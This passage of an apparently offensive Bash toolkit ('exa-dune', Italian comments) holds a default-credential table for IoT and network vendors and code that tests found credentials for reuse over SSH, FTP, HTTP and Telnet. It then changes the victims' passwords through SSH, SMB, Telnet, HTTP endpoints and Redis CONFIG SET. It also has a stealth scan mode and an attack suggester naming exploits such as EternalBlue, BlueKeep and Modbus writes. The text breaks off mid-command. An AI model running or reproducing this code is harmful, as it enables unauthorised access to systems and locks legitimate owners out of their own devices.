# ── Default credentials database ─────────────────────────────
_default_creds_for_vendor() {
    local vendor="${1,,}"
    case "$vendor" in
        audiocodes) echo "Admin:Admin Admin:1234 admin:admin" ;;
        dahua)      echo "admin:admin admin:dahua888 admin:" ;;
        hikvision)  echo "admin:12345 admin:Admin1234! admin:admin" ;;
        axis)       echo "root:pass root: admin:admin" ;;
        cisco)      echo "cisco:cisco admin:admin enable:cisco" ;;
        dlink)      echo "admin: admin:admin" ;;
        netgear)    echo "admin:password admin:1234" ;;
        zyxel)      echo "admin:1234 admin:admin zyfwp:PrOw!aN_fXp" ;;
        huawei)     echo "admin:admin admin:Admin@huawei.com" ;;
        commend)    echo "admin:admin admin:1234 Admin:Admin" ;;
        gai*)       echo "admin:admin admin:1234 user:user" ;;
        reolink)    echo "admin: admin:admin admin:12345" ;;
        *)          echo "admin:admin admin:password admin:1234 root:root" ;;
    esac
}

_make_vendor_creds_file() {
    # Crea file temporaneo coppie user:pass per hydra per un dato vendor
    local vendor="$1"
    local tmpfile; tmpfile=$(mktemp)
    local creds; creds=$(_default_creds_for_vendor "$vendor")
    for pair in $creds; do
        echo "${pair//:/ }" | awk '{print "-l "$1" -p "$2}' >> "$tmpfile" 2>/dev/null || true
        echo "$pair" >> "$tmpfile"
    done
    echo "$tmpfile"
}

# ── Credential Store ─────────────────────────────────────────
_cred_store_init() {
    # Inizializza creds.json se non esiste
    local f="$OUTDIR_BASE/creds.json"
    [[ "$DRY_RUN" -eq 1 ]] && return
    [[ -f "$f" ]] || echo '{"credentials":[]}' > "$f"
    CRED_STORE="$f"
}

_cred_store_add() {
    # _cred_store_add <service> <host> <port> <user> <pass> <source>
    local service="$1" host="$2" port="$3" user="$4" pass="$5" source="${6:-unknown}"
    [[ -z "$CRED_STORE" ]] && return 0
    [[ -f "$CRED_STORE" ]] || return 0
    [[ "$DRY_RUN" -eq 1 ]] && return 0
    export CRED_FILE="$CRED_STORE" C_SERVICE="$service" C_HOST="$host" \
           C_PORT="$port" C_USER="$user" C_PASS="$pass" C_SOURCE="$source"
    python3 - <<'PYEOF' 2>/dev/null || true
import json, os
f = os.environ['CRED_FILE']
with open(f) as fh:
    d = json.load(fh)
entry = {
    "service": os.environ['C_SERVICE'],
    "host": os.environ['C_HOST'],
    "port": os.environ['C_PORT'],
    "user": os.environ['C_USER'],
    "pass": os.environ['C_PASS'],
    "source": os.environ['C_SOURCE'],
    "timestamp": __import__('datetime').datetime.now().isoformat()
}
check = {k: entry[k] for k in ('service','host','port','user','pass')}
if not any(all(c.get(k)==check[k] for k in check) for c in d['credentials']):
    d['credentials'].append(entry)
with open(f + '.tmp', 'w') as fh:
    json.dump(d, fh, indent=2)
os.replace(f + '.tmp', f)
PYEOF
    unset CRED_FILE C_SERVICE C_HOST C_PORT C_USER C_PASS C_SOURCE
}

_cred_store_get() {
    # Ritorna lista credenziali per service (o tutte se service="*")
    # Output: righe "user:pass"
    local service="${1:-*}" host="${2:-}"
    [[ -z "$CRED_STORE" || ! -f "$CRED_STORE" ]] && return 0
    export CRED_FILE="$CRED_STORE" C_SERVICE="$service" C_HOST="$host"
    python3 - <<'PYEOF' 2>/dev/null || true
import json, os
f = os.environ['CRED_FILE']
svc = os.environ['C_SERVICE']
hst = os.environ.get('C_HOST', '')
with open(f) as fh:
    d = json.load(fh)
for c in d['credentials']:
    if (svc == '*' or c['service'] == svc) and (not hst or c['host'] == hst):
        print(f"{c['user']}\t{c['pass']}")
PYEOF
    unset CRED_FILE C_SERVICE C_HOST
}

_cred_store_summary() {
    # Stampa tabella riassuntiva credenziali trovate
    [[ -z "$CRED_STORE" || ! -f "$CRED_STORE" ]] && return 0
    export CRED_FILE="$CRED_STORE"
    local count
    count=$(python3 -c "import json,os; d=json.load(open(os.environ['CRED_FILE'])); print(len(d['credentials']))" 2>/dev/null || echo 0)
    [[ $count -eq 0 ]] && return 0
    section "Credenziali trovate ($count)"
    python3 - <<'PYEOF' 2>/dev/null || true
import json, os
f = os.environ['CRED_FILE']
with open(f) as fh:
    d = json.load(fh)
print(f"  {'SERVICE':<10} {'HOST':<16} {'PORT':<6} {'USER':<15} {'PASS':<20} {'SOURCE'}")
print(f"  {'-'*10} {'-'*16} {'-'*6} {'-'*15} {'-'*20} {'-'*15}")
for c in d['credentials']:
    print(f"  {c['service']:<10} {c['host']:<16} {c['port']:<6} {c['user']:<15} {c['pass']:<20} {c['source']}")
PYEOF
    unset CRED_FILE
}

_cred_propagate() {
    # Prende credenziali già trovate e le testa sui servizi aperti dello stesso host
    local target="$1"
    [[ -z "$CRED_STORE" || ! -f "$CRED_STORE" ]] && return 0
    [[ "$DRY_RUN" -eq 1 ]] && return 0
    local creds; creds=$(_cred_store_get "*" "$target")
    [[ -z "$creds" ]] && return 0
    section "Propagazione credenziali su $target"
    while IFS=$'\t' read -r user pass; do
        [[ -z "$user" || -z "$pass" ]] && continue
        # Testa SSH se porta aperta
        if check_port "$target" 22; then
            if tool_ok sshpass; then
                if sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 \
                   -o BatchMode=no "$user@$target" "id" 2>/dev/null | grep -q uid; then
                    found CRITICAL "Credential reuse: $user:$pass funziona su SSH ($target:22)"
                    _cred_store_add ssh "$target" 22 "$user" "$pass" "propagation"
                fi
            fi
        fi
        # Testa FTP
        if check_port "$target" 21; then
            if curl -s --connect-timeout 3 "ftp://$user:$pass@$target/" 2>/dev/null | grep -q .; then
                found HIGH "Credential reuse: $user:$pass funziona su FTP ($target:21)"
                _cred_store_add ftp "$target" 21 "$user" "$pass" "propagation"
            fi
        fi
        # Testa HTTP Basic Auth
        for hport in 80 443 8080 8443; do
            if check_port "$target" "$hport"; then
                local scheme="http"; [[ $hport -eq 443 || $hport -eq 8443 ]] && scheme="https"
                local http_code
                http_code=$(curl -sk -o /dev/null -w "%{http_code}" \
                    -u "$user:$pass" --connect-timeout 3 \
                    "$scheme://$target:$hport/" 2>/dev/null)
                if [[ "$http_code" =~ ^2 ]]; then
                    found HIGH "Credential reuse: $user:$pass funziona su HTTP ($target:$hport)"
                    _cred_store_add http "$target" "$hport" "$user" "$pass" "propagation"
                fi
            fi
        done
        # Testa Telnet
        if check_port "$target" 23; then
            if printf '%s\n%s\nexit\n' "$user" "$pass" | \
               nc -w 3 "$target" 23 2>/dev/null | grep -qiE "prompt|#|\\\$|>"; then
                found HIGH "Credential reuse: $user:$pass funziona su Telnet ($target:23)"
                _cred_store_add telnet "$target" 23 "$user" "$pass" "propagation"
            fi
        fi
    done <<< "$creds"
    _cred_store_summary
}

# ============================================================
#  CREDENTIAL CHANGE — dopo brute-force, cambia le credenziali
#  trovate con nuove credenziali e salva tutto nel report
# ============================================================

_gen_new_pass() {
    # Genera una nuova password robusta ma memorabile
    local _adjectives=("Red" "Blue" "Dark" "Fast" "Bold" "Cold" "Hard" "Soft" "Wild" "Neon")
    local _nouns=("Cobra" "Storm" "Blade" "Ghost" "Shark" "Eagle" "Tiger" "Raven" "Wolf" "Fox")
    local _adj="${_adjectives[$((RANDOM % ${#_adjectives[@]}))]}"
    local _noun="${_nouns[$((RANDOM % ${#_nouns[@]}))]}"
    local _num=$(( (RANDOM % 9000) + 1000 ))
    local _sym=("!" "@" "#" "$" "%")
    local _s="${_sym[$((RANDOM % ${#_sym[@]}))]}"
    echo "${_adj}${_noun}${_num}${_s}"
}

_gen_new_user() {
    # Genera un nuovo username casuale
    local _pfx=("svc" "usr" "net" "sys" "ops" "dev")
    local _p="${_pfx[$((RANDOM % ${#_pfx[@]}))]}"
    local _n=$(( (RANDOM % 900) + 100 ))
    echo "${_p}${_n}"
}

_cred_change_ssh() {
    # Cambia password via SSH con le credenziali trovate
    local _host="$1" _port="$2" _user="$3" _old_pass="$4" _new_pass="$5"
    local _result="failed"
    if command -v sshpass &>/dev/null; then
        # Tenta cambio password via passwd
        local _out
        _out=$(sshpass -p "$_old_pass" ssh \
            -o StrictHostKeyChecking=no -o ConnectTimeout=8 \
            -o BatchMode=no -p "$_port" \
            "${_user}@${_host}" \
            "echo '${_user}:${_new_pass}' | chpasswd 2>/dev/null || \
             (echo -e '${_old_pass}\n${_new_pass}\n${_new_pass}' | passwd 2>/dev/null)" \
            2>/dev/null || true)
        # Verifica che il cambio sia andato a buon fine tentando login con nuova pass
        sshpass -p "$_new_pass" ssh \
            -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
            -o BatchMode=no -p "$_port" \
            "${_user}@${_host}" "exit" 2>/dev/null && _result="success"
    fi
    echo "$_result"
}

_cred_change_ftp() {
    local _host="$1" _port="$2" _user="$3" _old_pass="$4" _new_pass="$5"
    local _result="unsupported"
    # FTP non ha un comando standard per cambiare password —
    # tenta via SITE PASSWD se supportato
    local _ftp_resp
    _ftp_resp=$(printf "USER %s\r\nPASS %s\r\nSITE PASSWD %s %s\r\nQUIT\r\n" \
        "$_user" "$_old_pass" "$_old_pass" "$_new_pass" | \
        timeout 8 nc -w 6 "$_host" "$_port" 2>/dev/null || true)
    echo "$_ftp_resp" | grep -qi "200\|Password changed\|PASSWD" && _result="success"
    echo "$_result"
}

_cred_change_http() {
    local _host="$1" _port="$2" _scheme="$3" _user="$4" _old_pass="$5" _new_pass="$6"
    local _result="failed"
    local _ins=""; [[ "$_scheme" == "https" ]] && _ins="-k"
    local _base="${_scheme}://${_host}:${_port}"
    # Endpoint comuni per cambio password
    local -a _ep=(
        "/api/change-password" "/api/v1/change-password" "/changepass"
        "/change-password" "/api/user/password" "/api/password/change"
        "/admin/change-password" "/user/change-password" "/account/password"
        "/api/me/password" "/api/account/password"
    )
    local -a _bodies=(
        "{\"old_password\":\"${_old_pass}\",\"new_password\":\"${_new_pass}\",\"confirm_password\":\"${_new_pass}\"}"
        "{\"current_password\":\"${_old_pass}\",\"new_password\":\"${_new_pass}\"}"
        "{\"password\":\"${_old_pass}\",\"newPassword\":\"${_new_pass}\"}"
        "old_password=${_old_pass}&new_password=${_new_pass}&confirm=${_new_pass}"
        "current=${_old_pass}&password=${_new_pass}&password_confirm=${_new_pass}"
    )
    for _e in "${_ep[@]}"; do
        for _b in "${_bodies[@]:0:2}"; do
            local _ct="application/json"
            echo "$_b" | grep -q "=" && _ct="application/x-www-form-urlencoded"
            local _code
            _code=$(curl -s $insecure -o /dev/null -w "%{http_code}" \
                --user "${_user}:${_old_pass}" --max-time 6 \
                -X POST -H "Content-Type: ${_ct}" -d "$_b" \
                "${_base}${_e}" 2>/dev/null || echo "000")
            if [[ "$_code" == "200" || "$_code" == "204" || "$_code" == "201" ]]; then
                _result="success"
                break 2
            fi
        done
    done
    echo "$_result"
}

_cred_change_smb() {
    local _host="$1" _port="$2" _user="$3" _old_pass="$4" _new_pass="$5"
    local _result="failed"
    if command -v smbpasswd &>/dev/null; then
        printf '%s\n%s\n%s\n' "$_old_pass" "$_new_pass" "$_new_pass" | \
            smbpasswd -r "$_host" -U "$_user" -s 2>/dev/null && _result="success"
    fi
    if [[ "$_result" == "failed" ]] && command -v impacket-changepasswd &>/dev/null; then
        impacket-changepasswd "${_host}/${_user}:${_old_pass}@${_host}" \
            -newpass "$_new_pass" 2>/dev/null && _result="success"
    fi
    echo "$_result"
}

_cred_change_telnet() {
    local _host="$1" _port="$2" _user="$3" _old_pass="$4" _new_pass="$5"
    local _result="failed"
    if command -v expect &>/dev/null; then
        local _expect_out
        _expect_out=$(expect -c "
            set timeout 10
            spawn telnet $_host $_port
            expect -re {(login|Username|user):}
            send \"${_user}\r\"
            expect -re {(Password|password):}
            send \"${_old_pass}\r\"
            expect -re {[#\$>]}
            send \"echo '${_user}:${_new_pass}' | chpasswd\r\"
            expect -re {[#\$>]}
            send \"passwd ${_user}\r\"
            expect -re {(New|new).*password}
            send \"${_new_pass}\r\"
            expect -re {(Retype|confirm|again)}
            send \"${_new_pass}\r\"
            expect -re {[#\$>]}
            send \"exit\r\"
            expect eof
        " 2>/dev/null || true)
        echo "$_expect_out" | grep -qi "success\|updated\|changed\|passwd:" && _result="success"
    fi
    echo "$_result"
}

_cred_change_redis() {
    local _host="$1" _port="$2" _user="$3" _old_pass="$4" _new_pass="$5"
    local _result="failed"
    local _auth_cmd=""
    [[ -n "$_old_pass" ]] && _auth_cmd="AUTH ${_old_pass}\r\n"
    local _resp
    _resp=$(printf "${_auth_cmd}CONFIG SET requirepass ${_new_pass}\r\nQUIT\r\n" | \
        timeout 6 nc -w 5 "$_host" "$_port" 2>/dev/null || true)
    echo "$_resp" | grep -q "+OK" && _result="success"
    echo "$_result"
}

_cred_change_mqtt() {
    local _host="$1" _port="$2" _user="$3" _old_pass="$4" _new_pass="$5"
    # MQTT non ha un protocollo per cambiare password —
    # se è mosquitto potremmo modificare il file via SSH, ma è fuori scope qui
    echo "unsupported"
}

_cred_change() {
    # Dispatcher: sceglie il metodo giusto in base al servizio
    # Ritorna "success|failed|unsupported" e stampa new_pass se success
    local _service="$1" _host="$2" _port="$3" _user="$4" _old_pass="$5" _new_pass="$6"
    case "$_service" in
        ssh)        _cred_change_ssh     "$_host" "$_port" "$_user" "$_old_pass" "$_new_pass" ;;
        ftp)        _cred_change_ftp     "$_host" "$_port" "$_user" "$_old_pass" "$_new_pass" ;;
        http|https) _cred_change_http    "$_host" "$_port" "$_service" "$_user" "$_old_pass" "$_new_pass" ;;
        smb)        _cred_change_smb     "$_host" "$_port" "$_user" "$_old_pass" "$_new_pass" ;;
        telnet)     _cred_change_telnet  "$_host" "$_port" "$_user" "$_old_pass" "$_new_pass" ;;
        redis)      _cred_change_redis   "$_host" "$_port" "$_user" "$_old_pass" "$_new_pass" ;;
        mqtt)       _cred_change_mqtt    "$_host" "$_port" "$_user" "$_old_pass" "$_new_pass" ;;
        *)          echo "unsupported" ;;
    esac
}

_cred_change_store_update() {
    # Aggiorna creds.json con il risultato del cambio credenziali
    local _service="$1" _host="$2" _port="$3" _user="$4" _old_pass="$5" \
          _new_pass="$6" _status="$7"
    [[ -z "$CRED_STORE" || ! -f "$CRED_STORE" ]] && return 0
    export CRED_FILE="$CRED_STORE" C_SERVICE="$_service" C_HOST="$_host" \
           C_PORT="$_port" C_USER="$_user" C_OLD_PASS="$_old_pass" \
           C_NEW_PASS="$_new_pass" C_STATUS="$_status"
    python3 - <<'PYEOF' 2>/dev/null || true
import json, os, datetime
f = os.environ['CRED_FILE']
svc  = os.environ['C_SERVICE']
hst  = os.environ['C_HOST']
prt  = os.environ['C_PORT']
usr  = os.environ['C_USER']
oldp = os.environ['C_OLD_PASS']
newp = os.environ['C_NEW_PASS']
sts  = os.environ['C_STATUS']
with open(f) as fh:
    d = json.load(fh)
for c in d['credentials']:
    if (c['service'] == svc and c['host'] == hst and
            c['port'] == prt and c['user'] == usr and c['pass'] == oldp):
        c['changed']           = (sts == 'success')
        c['new_pass']          = newp if sts == 'success' else ''
        c['change_status']     = sts
        c['change_timestamp']  = datetime.datetime.now().isoformat()
        break
with open(f + '.tmp', 'w') as fh:
    json.dump(d, fh, indent=2)
os.replace(f + '.tmp', f)
PYEOF
    unset CRED_FILE C_SERVICE C_HOST C_PORT C_USER C_OLD_PASS C_NEW_PASS C_STATUS
}

_cred_change_all() {
    # Itera tutte le credenziali trovate e tenta di cambiarle
    local _target="${1:-}"
    [[ -z "$CRED_STORE" || ! -f "$CRED_STORE" ]] && return 0
    [[ "$DRY_RUN" -eq 1 ]] && return 0

    local _creds
    _creds=$(_cred_store_get "*" "$_target")
    [[ -z "$_creds" ]] && return 0

    section "Credential Change — sostituzione credenziali trovate"
    local _changed=0 _failed=0 _unsupported=0
    local _change_log="${OUTDIR_BASE}/cred_changes.txt"
    {
        echo "══════════════════════════════════════════════════════════════"
        echo "  CREDENTIAL CHANGE REPORT — exa-dune v${VERSION}"
        echo "  Data: $(date)"
        echo "  Target: ${_target}"
        echo "══════════════════════════════════════════════════════════════"
        echo ""
    } > "$_change_log"

    # Legge creds.json per ottenere service/port oltre a user:pass
    export CRED_FILE="$CRED_STORE" CRED_TARGET="$_target"
    local _cred_list
    _cred_list=$(python3 - 2>/dev/null <<'PYEOF'
import json, os
f   = os.environ['CRED_FILE']
tgt = os.environ.get('CRED_TARGET', '')
with open(f) as fh:
    d = json.load(fh)
for c in d['credentials']:
    if tgt and c['host'] != tgt:
        continue
    # Salta gia cambiati
    if c.get('changed'):
        continue
    print(c['service'] + "\t" + c['host'] + "\t" + str(c['port']) + "\t" + c['user'] + "\t" + c['pass'])
PYEOF
) || true
    unset CRED_FILE CRED_TARGET

    [[ -z "$_cred_list" ]] && log "Nessuna credenziale da modificare" && return 0

    while IFS=$'\t' read -r _svc _hst _prt _usr _pss; do
        [[ -z "$_usr" ]] && continue
        local _new_p; _new_p=$(_gen_new_pass)
        log "  ▶ Tentativo cambio — ${_svc}://${_hst}:${_prt} ${_usr}:${_pss} → nuova: ${_new_p}"

        local _status
        _status=$(_cred_change "$_svc" "$_hst" "$_prt" "$_usr" "$_pss" "$_new_p")

        case "$_status" in
            success)
                found CRITICAL "CRED CHANGE — ${_svc} ${_usr}@${_hst}:${_prt}: password cambiata!"
                ok "  Vecchia: ${_pss}  →  Nuova: ${_new_p}"
                _cred_change_store_update "$_svc" "$_hst" "$_prt" "$_usr" "$_pss" "$_new_p" "success"
                {
                    echo "[SUCCESS] ${_svc^^} — ${_hst}:${_prt}"
                    echo "  Username      : ${_usr}"
                    echo "  Password orig : ${_pss}"
                    echo "  Password nuova: ${_new_p}"
                    echo "  Timestamp     : $(date)"
                    echo ""
                } >> "$_change_log"
                ((_changed++)) || true
                ;;
            failed)
                warn "  Cambio fallito su ${_svc} ${_usr}@${_hst}:${_prt}"
                _cred_change_store_update "$_svc" "$_hst" "$_prt" "$_usr" "$_pss" "" "failed"
                {
                    echo "[FAILED]  ${_svc^^} — ${_hst}:${_prt} user=${_usr}"
                    echo ""
                } >> "$_change_log"
                ((_failed++)) || true
                ;;
            unsupported)
                log "  Cambio non supportato su ${_svc}"
                _cred_change_store_update "$_svc" "$_hst" "$_prt" "$_usr" "$_pss" "" "unsupported"
                ((_unsupported++)) || true
                ;;
        esac
    done <<< "$_cred_list"

    echo "" >> "$_change_log"
    echo "Totale: ${_changed} cambiati | ${_failed} falliti | ${_unsupported} non supportati" >> "$_change_log"
    log "Credential change completato → $_change_log"
    log "  Cambiati: $_changed | Falliti: $_failed | Non supportati: $_unsupported"
}

_cred_change_summary() {
    # Sezione report: mostra vecchie e nuove credenziali
    [[ -z "$CRED_STORE" || ! -f "$CRED_STORE" ]] && return 0
    export CRED_FILE="$CRED_STORE"
    local _count
    _count=$(python3 -c "
import json,os
d=json.load(open(os.environ['CRED_FILE']))
print(sum(1 for c in d['credentials'] if c.get('changed')))
" 2>/dev/null || echo 0)
    [[ "$_count" -eq 0 ]] && return 0

    section "Credenziali modificate ($_count)"
    python3 - <<'PYEOF' 2>/dev/null || true
import json, os
f = os.environ['CRED_FILE']
with open(f) as fh:
    d = json.load(fh)
changed = [c for c in d['credentials'] if c.get('changed')]
if not changed:
    print("  Nessuna credenziale modificata")
    exit()
print(f"  {'SERVICE':<10} {'HOST':<16} {'PORT':<6} {'USER':<15} {'PASS ORIG':<20} {'PASS NUOVA':<20} {'STATUS'}")
print(f"  {'-'*10} {'-'*16} {'-'*6} {'-'*15} {'-'*20} {'-'*20} {'-'*10}")
for c in changed:
    sts = '✓ changed' if c.get('changed') else c.get('change_status','?')
    print(f"  {c['service']:<10} {c['host']:<16} {c['port']:<6} {c['user']:<15} {c['pass']:<20} {c.get('new_pass',''):<20} {sts}")
PYEOF
    unset CRED_FILE
}

apply_stealth() {
    if [[ $STEALTH -eq 1 ]]; then
        NMAP_TIMING="-T2"; NMAP_RATE_FAST=300; NMAP_RATE_FULL=500
        warn "Stealth mode: nmap -T2, rate ridotto"
    fi
}

# ── Rate Limiting Adattivo ─────────────────────────────────────────────────
# Analizza il log nmap appena completato e riduce il rate se rileva segnali
# di rate-limiting o host irresponsivi. Chiamata solo se ADAPTIVE=1.
_adaptive_rate_check() {
    local log_file="${1:-}"
    [[ "${ADAPTIVE:-0}" -ne 1 ]] && return
    [[ -z "$log_file" || ! -f "$log_file" ]] && return

    local total_packets reset_count unresponsive_count
    # Conta pacchetti totali inviati (stima da nmap output)
    total_packets=$(grep -c "Sending\|sent" "$log_file" 2>/dev/null || echo 0)
    # Conta RST/reset ricevuti
    reset_count=$(grep -ciE "reset|RST|connection refused" "$log_file" 2>/dev/null || echo 0)
    # Conta host non rispondenti
    unresponsive_count=$(grep -ciE "host down|no response|filtered" "$log_file" 2>/dev/null || echo 0)

    local changed=0

    # Se >10% reset → riduci rate del 20%
    if [[ $total_packets -gt 0 && $reset_count -gt 0 ]]; then
        local pct
        if [[ $total_packets -gt 0 ]]; then
            pct=$(( reset_count * 100 / total_packets ))
        else
            pct=0
        fi
        if [[ $pct -gt 10 ]]; then
            local old_rate=$NMAP_RATE_FAST
            NMAP_RATE_FAST=$(( NMAP_RATE_FAST * 80 / 100 ))
            [[ $NMAP_RATE_FAST -lt 50 ]] && NMAP_RATE_FAST=50
            NMAP_RATE_FULL=$(( NMAP_RATE_FULL * 80 / 100 ))
            [[ $NMAP_RATE_FULL -lt 100 ]] && NMAP_RATE_FULL=100
            warn "[ADAPTIVE] Rilevati ${reset_count} TCP reset (${pct}%) — rate ridotto: ${old_rate} → ${NMAP_RATE_FAST} pps"
            changed=1
        fi
    fi

    # Se host irresponsivo → passa a -T2 (stealth)
    if [[ $unresponsive_count -gt 5 ]]; then
        if [[ "$NMAP_TIMING" != "-T2" ]]; then
            warn "[ADAPTIVE] Host non responsivo (${unresponsive_count} occorrenze) — passaggio a timing -T2"
            NMAP_TIMING="-T2"
            [[ $NMAP_RATE_FAST -gt 300 ]] && NMAP_RATE_FAST=300
            [[ $NMAP_RATE_FULL -gt 500 ]] && NMAP_RATE_FULL=500
            changed=1
        fi
    fi

    [[ $changed -eq 0 ]] && log "[ADAPTIVE] Nessun adattamento necessario (reset=${reset_count}, unresponsive=${unresponsive_count})"
}

# ── Attack Suggester ─────────────────────────────────────────────────────────
# Legge nmap output e restituisce una lista ordinata di attacchi consigliati.
# Output: righe nel formato "PRIORITY|MODULE|ARGS|REASON"
_suggest_attacks() {
    local nmap_file="$1"   # path a nmap_fast.nmap o nmap_fast.gnmap
    local target="$2"
    [[ ! -f "$nmap_file" ]] && return

    local open_ports=""
    # Supporta sia .nmap che .gnmap
    if grep -qE "^[0-9]+/tcp" "$nmap_file" 2>/dev/null; then
        # formato .nmap
        open_ports=$(grep -E "^[0-9]+/tcp.*open" "$nmap_file" | grep -oP "^[0-9]+" | tr '\n' ' ')
    else
        # formato .gnmap
        open_ports=$(grep -oP "[0-9]+/open" "$nmap_file" | grep -oP "^[0-9]+" | tr '\n' ' ')
    fi

    local suggestions=()

    # Mappa porta → modulo + args + motivo
    # Formato: "PRIORITY|MODULE|ARGS|REASON"
    for p in $open_ports; do
        case "$p" in
            80)   suggestions+=("10|web|$target --port 80 --scheme http|HTTP aperto — audit web (nikto, gobuster, header, SQLi, LFI)") ;;
            443)  suggestions+=("10|web|$target --port 443 --scheme https|HTTPS aperto — audit web con SSL") ;;
            8080) suggestions+=("11|web|$target --port 8080 --scheme http|HTTP alternativo 8080 — spesso admin panel embedded") ;;
            8443) suggestions+=("11|web|$target --port 8443 --scheme https|HTTPS alternativo — admin panel o API") ;;
            8081|8082|8888|9090|9443)
                  suggestions+=("12|web|$target --port $p --scheme http|Porta web non standard — possibile admin/API esposto") ;;
            22)   suggestions+=("20|ssh|$target|SSH aperto — audit algoritmi + brute force credenziali") ;;
            23)   suggestions+=("15|telnet|$target --ports 23|Telnet aperto — brute force + banner grab (CRITICAL: cleartext)") ;;
            2323) suggestions+=("15|telnet|$target --ports 2323|Telnet alternativo — comune su router/IoT") ;;
            2002) suggestions+=("15|telnet|$target --ports 2002|Telnet VoIP — credenziali default") ;;
            21)   suggestions+=("18|ftp|$target|FTP aperto — accesso anonimo, traversal, brute force") ;;
            445|139)
                  suggestions+=("14|smb|$target|SMB aperto — EternalBlue, null session, enum share, brute force") ;;
            5060|5061)
                  suggestions+=("13|sip|$target|SIP/VoIP aperto — enum extension, password crack, toll fraud") ;;
            554|8554)
                  suggestions+=("16|rtsp|$target|RTSP aperto — stream IP camera, brute force credenziali") ;;
            1883|8883)
                  suggestions+=("19|mqtt|$target|MQTT aperto — broker IoT, accesso anonimo, wildcard subscribe") ;;
            502)  suggestions+=("17|modbus|$target|Modbus aperto — PLC/ICS esposto, lettura registri, write access") ;;
            3389) suggestions+=("21|rdp|$target|RDP aperto — BlueKeep, NLA check, brute force") ;;
            5900) suggestions+=("21|vnc|$target|VNC aperto — weak auth, brute force password") ;;
            389|636)
                  suggestions+=("22|ldap|$target|LDAP aperto — anonymous bind, enum utenti/gruppi/policy") ;;
            6379) suggestions+=("16|redis|$target|Redis aperto — accesso no-auth, config dump, RCE via CONFIG SET") ;;
            53)   suggestions+=("25|dns|$target|DNS aperto — zone transfer, subdomain brute force, cache snooping") ;;
            1900|5000)
                  suggestions+=("24|upnp|$target|UPnP aperto — device description, port mapping senza auth") ;;
            69)   suggestions+=("23|tftp|$target|TFTP aperto — download configurazione, firmware") ;;
            623)  suggestions+=("23|ipmi|$target|IPMI/BMC aperto — auth bypass, credenziali default") ;;
            161|162)
                  suggestions+=("13|snmp|$target|SNMP aperto — community brute force, OID walk, WRITE test") ;;
            44818|102)
                  suggestions+=("17|modbus|$target|Porta ICS/SCADA — audit Modbus/industrial protocol") ;;
            8000) suggestions+=("16|onvif|$target --port 8000|ONVIF/gSOAP esposto — brute force WS-Security, GetDeviceInfo") ;;
            1935) suggestions+=("19|rtmp|$target --port 1935|RTMP esposto — probe stream DVR/NVR/telecamere") ;;
            5683) suggestions+=("23|coap|$target|CoAP esposto — dispositivo IoT, risorse pubbliche") ;;
            3702) suggestions+=("24|wsd|$target|WS-Discovery (3702) — device fingerprint telecamere/stampanti") ;;
            47808) suggestions+=("17|bacnet|$target|BACnet/IP (47808) — building automation, lettura oggetti") ;;
            5353) suggestions+=("24|mdns|$target|mDNS/Bonjour (5353) — servizi Zeroconf sulla rete locale") ;;
        esac
    done

    # Dedup (stessa priorità+modulo)
    local seen=()
    local -A seen_map
    for s in "${suggestions[@]}"; do
        local key; key=$(echo "$s" | cut -d'|' -f1,2)
        if [[ -z "${seen_map[$key]:-}" ]]; then
            seen_map[$key]=1
            seen+=("$s")
        fi
    done

    # Ordina per priorità (campo 1) e stampa
    printf '%s\n' "${seen[@]}" | sort -t'|' -k1,1n
}

# Stampa i suggerimenti in modo formattato a schermo
_print_suggestions() {
    local nmap_file="$1" target="$2"
    echo ""
    echo -e "${BOLD}${CYAN}╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BOLD}${CYAN}║           ATTACCHI CONSIGLIATI — AUTO-SUGGEST            ║${NC}"
    echo -e "${BOLD}${CYAN}╚══════════════════════════════════════════════════════════╝${NC}"
    echo ""
    local n=0
    while IFS='|' read -r prio module args reason; do
        ((n++)) || true
        local color="$GREEN"
        [[ $prio -le 15 ]] && color="$RED"
        [[ $prio -le 18 && $prio -gt 15 ]] && color="$YELLOW"
        printf "  ${color}[%2d]${NC} %-10s %s\n" "$n" "$module" "$reason"
        echo -e "       ${CYAN}→${NC} exa-dune $module $args"
        echo ""
    done < <(_suggest_attacks "$nmap_file" "$target")
    [[ $n -eq 0 ]] && warn "Nessuna porta mappabile trovata — esegui prima: exa-dune scan $target" || true
}

# ============================================================
#  SUBCOMMAND: scan
# ============================================================
usage_scan() {
    echo "Uso: exa-dune scan <TARGET> [OPTIONS]"
    echo ""
    echo "  Port scan + fingerprinting + recon"
    echo "  Wraps: nmap (fast/full/UDP), arp-scan, searchsploit"
    echo ""
    echo "Opzioni:"
    echo "  --stealth          nmap -T2, rate ridotto"
    echo "  --udp-top N        UDP top N porte (default: 20)"
    echo "  --no-full          Salta nmap -p- (full port scan)"
    echo "  --vuln             Esegui nmap --script vuln sui port aperti"
    echo "  --timeout N        Timeout in minuti per ogni tool (default: nessuno)"
    echo "  --output DIR       Directory di output"
    echo "  --dry-run          Mostra comandi senza eseguire"
}

cmd_scan() {
    local target="" udp_top=20 do_full=1 do_vuln=0 do_masscan=0
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --stealth)   STEALTH=1;        shift ;;
            --udp-top)   _req_arg "$1" "${2:-}"; udp_top="$2";     shift 2 ;;
            --no-full)   do_full=0;        shift ;;
            --vuln)      do_vuln=1;        shift ;;
            --masscan)   do_masscan=1;     shift ;;
            --timeout)   _req_arg "$1" "${2:-}"; TIMEOUT="$2"; validate_timeout "$2"; shift 2 ;;
            --output)    _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
            --dry-run)   DRY_RUN=1;        shift ;;
            --help|-h)   usage_scan; exit 0 ;;
            -*)          err "Opzione sconosciuta: $1"; usage_scan; exit 1 ;;
            *)           target="$1"; shift ;;
        esac
    done
    [[ -z "$target" ]] && { err "TARGET mancante"; usage_scan; exit 1; }
    validate_target "$target"
    check_root
    apply_stealth
    setup_outdir "$target" "scan"
    log "Target: $target | Output: $OUTDIR"

    # ── Masscan pre-scan (reti /24 o flag --masscan) ─────────
    # Attiva automaticamente se il target è una rete (contiene /) o se --masscan è passato
    local _is_network=0
    echo "$target" | grep -qE '/' && _is_network=1
    if [[ $do_masscan -eq 1 || $_is_network -eq 1 ]]; then
        section "Masscan pre-scan (porte 1-65535)"
        if command -v masscan &>/dev/null; then
            local _mscan_target="$target"
            [[ $_is_network -eq 0 ]] && _mscan_target="${target}/32"
            run_cmd "masscan" \
                "masscan '$_mscan_target' -p 1-65535 --rate 10000 \
